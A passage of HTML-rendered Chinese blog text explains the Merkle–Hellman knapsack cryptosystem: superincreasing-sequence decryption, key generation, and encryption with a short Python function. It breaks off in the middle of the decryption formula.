class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">前</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">至</span><span class="mord cjk_fallback">少</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">倍</span><span class="mord">”</span></span></span></span></span></p>
<p>如果加密后的结果大于 an 的话，其前面的系数为必须 1 的。反之，无论如何也无法使得等式成立。因此，我们可以立马得到对应的明文。</p>
<p>举个例子</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>有</mtext><mi>M</mi><mo>=</mo><mtext>（</mtext><mn>3</mn><mtext>，</mtext><mn>11</mn><mtext>，</mtext><mn>24</mn><mtext>，</mtext><mn>50</mn><mtext>，</mtext><mn>115</mn><mtext>）是超递增序列，</mtext><mi>S</mi><mo>=</mo><mn>142</mn><mtext>；</mtext><mspace linebreak="newline"></mspace><mtext>那么先看</mtext><mn>142</mn><mo>&gt;</mo><mn>115</mn><mtext>，输出</mtext><mn>115</mn><mtext>，此时</mtext><mi>S</mi><mtext>变为</mtext><mn>142</mn><mo>−</mo><mn>115</mn><mo>=</mo><mn>27.</mn><mspace linebreak="newline"></mspace><mtext>略过</mtext><mn>50</mn><mtext>输出</mtext><mn>24</mn><mtext>，</mtext><mi>S</mi><mtext>变为</mtext><mn>3</mn><mtext>，</mtext><mn>3</mn><mo>=</mo><mn>3</mn><mtext>输出</mtext><mn>3.</mn><mspace linebreak="newline"></mspace><mtext>则生成了二进制向量</mtext><mi>x</mi><mo>=</mo><mtext>（</mtext><mn>1</mn><mtext>，</mtext><mn>0</mn><mtext>，</mtext><mn>1</mn><mtext>，</mtext><mn>0</mn><mtext>，</mtext><mn>1</mn><mtext>）完成解密</mtext></mrow><annotation encoding="application/x-tex">有M=（3，11，24，50，115）是超递增序列，S=142；\\那么先看142&gt;115，输出115，此时S变为142-115=27.\\略过50输出24，S变为3，3=3输出3.\\则生成了二进制向量x=（1，0，1，0，1）完成解密
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">有</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">（</span><span class="mord">3</span><span class="mord cjk_fallback">，</span><span class="mord">1</span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord">2</span><span class="mord">4</span><span class="mord cjk_fallback">，</span><span class="mord">5</span><span class="mord">0</span><span class="mord cjk_fallback">，</span><span class="mord">1</span><span class="mord">1</span><span class="mord">5</span><span class="mord cjk_fallback">）</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">超</span><span class="mord cjk_fallback">递</span><span class="mord cjk_fallback">增</span><span class="mord cjk_fallback">序</span><span class="mord cjk_fallback">列</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">4</span><span class="mord">2</span><span class="mord cjk_fallback">；</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">先</span><span class="mord cjk_fallback">看</span><span class="mord">1</span><span class="mord">4</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">5</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">输</span><span class="mord cjk_fallback">出</span><span class="mord">1</span><span class="mord">1</span><span class="mord">5</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">时</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">为</span><span class="mord">1</span><span class="mord">4</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">1</span><span class="mord">5</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">7</span><span class="mord">.</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">略</span><span class="mord cjk_fallback">过</span><span class="mord">5</span><span class="mord">0</span><span class="mord cjk_fallback">输</span><span class="mord cjk_fallback">出</span><span class="mord">2</span><span class="mord">4</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">为</span><span class="mord">3</span><span class="mord cjk_fallback">，</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord cjk_fallback">输</span><span class="mord cjk_fallback">出</span><span class="mord">3</span><span class="mord">.</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">则</span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">制</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">（</span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord">0</span><span class="mord cjk_fallback">，</span><span class="mord">1</span><span class="mord cjk_fallback">，</span><span class="mord">0</span><span class="mord cjk_fallback">，</span><span class="mord">1</span><span class="mord cjk_fallback">）</span><span class="mord cjk_fallback">完</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">解</span><span class="mord cjk_fallback">密</span></span></span></span></span></p>
<p>想要解密就必须要找到一个合法的 x，它的和等于 S</p>
<p>为了起到添加陷门信息的作用，下面两个人出场了</p>
<h2 id="merklehellman"><a class="anchor" href="#merklehellman">#</a> Merkle–Hellman</h2>
<p>我们可以使用初始的背包集作为私钥，变换后的背包集作为公钥保证传递的安全性</p>
<h3 id="生成私钥"><a class="anchor" href="#生成私钥">#</a> 生成私钥</h3>
<p>使用超递增序列：假设 a1=1，那么 a2 大于 1 以此依次生成后面的值。</p>
<h3 id="生成公钥"><a class="anchor" href="#生成公钥">#</a> 生成公钥</h3>
<p>主要使用模乘</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>首先生成模乘的模数</mtext><mi>m</mi><mspace width="1em"/><mi>m</mi><mo>&gt;</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>i</mi><mo>=</mo><mi>n</mi></mrow></munderover><msub><mi>a</mi><mi>i</mi></msub><mspace linebreak="newline"></mspace><mtext>其次，选择模乘的乘数</mtext><mi>w</mi><mtext>作为私钥使得</mtext><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>w</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mspace linebreak="newline"></mspace><mtext>通过</mtext><mspace width="1em"/><msub><mi>b</mi><mi>i</mi></msub><mo>≡</mo><mi>w</mi><msub><mi>a</mi><mi>i</mi></msub><mi>m</mi><mi>o</mi><mi>d</mi><mi>m</mi><mspace width="1em"/><mtext>生成公钥，并将新的背包集</mtext><msub><mi>b</mi><mi>i</mi></msub><mtext>和</mtext><mi>m</mi><mtext>作为公钥</mtext></mrow><annotation encoding="application/x-tex">首先生成模乘的模数m \quad m&gt; \sum _{i=1}^{i=n}a_i \\ 其次，选择模乘的乘数w作为私钥使得gcd(w,m)=1\\通过 \quad b_i \equiv wa_imodm \quad 生成公钥，并将新的背包集b_i和m作为公钥
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72243em;vertical-align:-0.0391em;"></span><span class="mord cjk_fallback">首</span><span class="mord cjk_fallback">先</span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.089338em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8116690000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">次</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">选</span><span class="mord cjk_fallback">择</span><span class="mord cjk_fallback">模</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">私</span><span class="mord cjk_fallback">钥</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">得</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:1em;"></span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">公</span><span class="mord cjk_fallback">钥</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">并</span><span class="mord cjk_fallback">将</span><span class="mord cjk_fallback">新</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">背</span><span class="mord cjk_fallback">包</span><span class="mord cjk_fallback">集</span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">和</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">公</span><span class="mord cjk_fallback">钥</span></span></span></span></span></p>
<h3 id="加密"><a class="anchor" href="#加密">#</a> 加密</h3>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>假设加密明文为</mtext><mi>v</mi><mo separator="true">,</mo><mtext>其每一个比特位为</mtext><msub><mi>v</mi><mi>i</mi></msub><mtext>，那么我们加密的结果为</mtext><mspace width="1em"/><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>i</mi><mo>=</mo><mi>n</mi></mrow></munderover><msub><mi>b</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub><mi>m</mi><mi>o</mi><mi>d</mi><mi>m</mi></mrow><annotation encoding="application/x-tex">假设加密明文为v,其每一个比特位为 v_i，那么我们加密的结果为 \quad \sum _{i=1}^{i=n}b_iv_imodm
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.089338em;vertical-align:-1.277669em;"></span><span class="mord cjk_fallback">假</span><span class="mord cjk_fallback">设</span><span class="mord cjk_fallback">加</span><span class="mord cjk_fallback">密</span><span class="mord cjk_fallback">明</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">每</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">为</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">加</span><span class="mord cjk_fallback">密</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">结</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">为</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8116690000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">m</span></span></span></span></span></p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> pubKey<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    msg_bit <span class="token operator">=</span> msg</pre></td></tr><tr><td data-num="3"></td><td><pre>    n <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>pubKey<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    cipher <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    i <span class="token operator">=</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">for</span> bit <span class="token keyword">in</span> msg_bit<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        cipher <span class="token operator">+=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>bit<span class="token punctuation">)</span><span class="token operator">*</span>pubKey<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        i <span class="token operator">+=</span> <span class="token number">1</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">return</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span></pre></td></tr></table></figure><h3 id="解密"><a class="anchor" href="#解密">#</a> 解密</h3>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>首先可以求</mtext><mi>w</mi><mtext>关于</mtext><mi>m</mi><mtext>的逆元</mtext><msup><mi>w</mi><mrow><mtext>−</mtext><mn>1</mn></mrow></msup><mspace width="1em"/><mtext>然后将得到的密文乘以</mtext><msup><mi>w</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mtext>即可得到明文</mtext><mspace linebreak="newline"></mspace><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>i</mi><mo>=</mo><mi>n</mi></mrow></munderover><msup><mi>w</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><msub><mi>b</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub><mi>m</mi><mi>o</mi><mi>d</mi><mi>m</mi><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>i</mi><mo>=</mo><mi>n</mi></mrow></munderover><msub><mi>a</mi><mi>i</mi></msub><msub><mi>v</mi><mi>i</mi></msub><mi>m</mi><mi>o</mi><mi>d</mi><mi>m</mi><mspace linebreak="newline"></mspace><mtext>且</mtext><msub><mi>b</mi><mi>i</mi></msub><mo>≡</mo><mi>w</mi><msub><mi>a</mi><mi>i</mi></msub><mi>m</mi><mi>o</mi><mi>d</mi><mi>m</mi><mspace width="1em"/><mtext>每一块的加密的消息都是小于</mtext><mi>m</mi><mtext>的</mtext></mrow><annotation encoding="application/x-tex">首先可以求w 关于 m 的逆元 w^{−1}

\quad 然后将得到的密文乘以 w^{-1}
即可得到明文\\\sum_{i=1}^{i=n}w^{-1}b_iv_imodm=\sum_{i=1}^{i=n}a_iv_imodm\\且b_i \equiv wa_imodm \quad 每一块的加密的消息都是小于 m 的
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.864108em;vertical-align:0em;"></span><span class="mord cjk_fallback">首</span><span class="mord cjk_fallback">先</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">求</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord cjk_fallback">关</span><span class="mord cjk_fallback">于</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">逆</span><span class="mord cjk_fallback">元</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">将</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">密</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">以</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">即</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">明</span><span class="mord cjk_fallback">文</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:3.089338em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8116690000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.089338em;vertical-align:-1.277669em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8116690000000002em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" 